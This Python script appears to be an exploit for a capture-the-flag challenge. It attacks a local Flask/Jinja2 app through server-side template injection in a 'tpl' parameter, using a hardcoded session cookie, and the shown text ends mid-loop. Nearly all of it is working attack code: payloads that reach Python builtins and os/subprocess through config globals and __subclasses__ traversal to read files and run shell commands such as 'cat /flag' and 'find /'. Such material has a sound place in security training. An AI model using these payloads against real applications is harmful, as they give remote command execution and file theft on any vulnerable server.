import requests
import re
import sys

# Target information
base_url = "http://127.0.0.1:33206"
endpoint = "/home"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVf2fw.j_8PfP_Q8ZnizbshSZCaN5dReao"

headers = {
    'Cookie': session_cookie
}

print(f"[*] Target: {base_url}{endpoint}")
print(f"[*] Session cookie: {session_cookie}")
print(f"[*] Testing SSTI payloads to read flag file\n")

# Common file paths to try
flag_paths = ['/flag', '/flag.txt', '/flags/flag', '/flags/flag.txt', '/app/flag', '/app/flag.txt']

# Common SSTI payloads for reading files
def test_payload(payload, description):
    """Test a single SSTI payload"""
    print(f"[*] Testing: {description}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.get(f"{base_url}{endpoint}", params={'tpl': payload}, headers=headers, timeout=10)
        
        # Check if there's an error (common with bad payloads)
        if response.status_code == 500:
            print(f"[!] Server error (likely invalid payload)")
            return None
        
        # Remove the injected payload from response to see actual output
        clean_response = response.text.replace(payload, '[PAYLOAD_REMOVED]')
        
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response length: {len(response.text)} bytes")
        
        # Look for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"\n[!] FLAG FOUND: {flag}")
            print(f"[!] Response:\n{clean_response}\n")
            return flag
        
        # Check if we got file content or command output
        if clean_response and '[PAYLOAD_REMOVED]' in response.text:
            # Extract content after payload removal
            pattern = re.compile(r'\[PAYLOAD_REMOVED\](.*?)\[PAYLOAD_REMOVED\]', re.DOTALL)
            match = pattern.search(response.text)
            if match:
                extracted_content = match.group(1).strip()
                if extracted_content and len(extracted_content) < 1000:
                    print(f"[+] Extracted content:\n{extracted_content}\n")
                    return extracted_content
        
        print(f"[+] Full response:\n{clean_response}\n")
        return response.text
        
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return None

print("="*80)
print("PHASE 1: Direct file access via config object")
print("="*80)

# Using config object directly
for path in flag_paths:
    payload = f"{{{{config.__class__.__init__.__globals__['__builtins__']['open']('{path}').read()}}}}"
    result = test_payload(payload, f"Direct file read via config: {path}")
    if result and 'FLAG' in str(result):
        print("[!] SUCCESS! Flag found via direct file access!")
        sys.exit(0)

# Using os.popen via config
print("\n" + "="*80)
print("PHASE 2: Using os.popen via config object")
print("="*80)

commands = [
    "cat /flag",
    "cat /flag.txt",
    "cat /app/flag",
    "cat /app/flag.txt",
    "ls -la /",
    "ls -la /flag*",
    "ls -la /*flag*",
    "find / -name *flag* 2>/dev/null",
    "ls -la /app",
    "ls -la /app/*flag*"
]

# Using os.popen via config
for cmd in commands:
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"
    result = test_payload(payload, f"Command execution: {cmd}")
    if result and 'FLAG' in str(result):
        print("[!] SUCCESS! Flag found via command execution!")
        sys.exit(0)

print("\n" + "="*80)
print("PHASE 3: Using subprocess module")
print("="*80)

# Try subprocess.Popen
subprocess_payload = "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').Popen(['cat','/flag'],stdout=-1).communicate()[0]}}"
result = test_payload(subprocess_payload, "subprocess.Popen to read /flag")
if result and 'FLAG' in str(result):
    print("[!] SUCCESS! Flag found via subprocess!")
    sys.exit(0)

# Another variant
subprocess_payload2 = "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['cat','/flag']).decode()}}"
result = test_payload(subprocess_payload2, "subprocess.check_output")
if result and 'FLAG' in str(result):
    print("[!] SUCCESS! Flag found via subprocess!")
    sys.exit(0)

print("\n" + "="*80)
print("PHASE 4: Finding file access via object traversal")
print("="*80)

# Try to find the right subclass index for file operations
# Common indices: 40, 59, 64, 79, 80, 82
common_indices = [40, 59, 64, 79, 80, 81, 82, 83, 84, 85]

for idx in common_indices:
    # Try direct file read
    for path in flag_paths:
        payload = f"{{{{''.__class__.__mro__[2].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('{path}').read()}}}}"
        result = test_payload(payload, f"Object traversal idx={idx}, file={path}")
        if result and 'FLAG' in str(result):
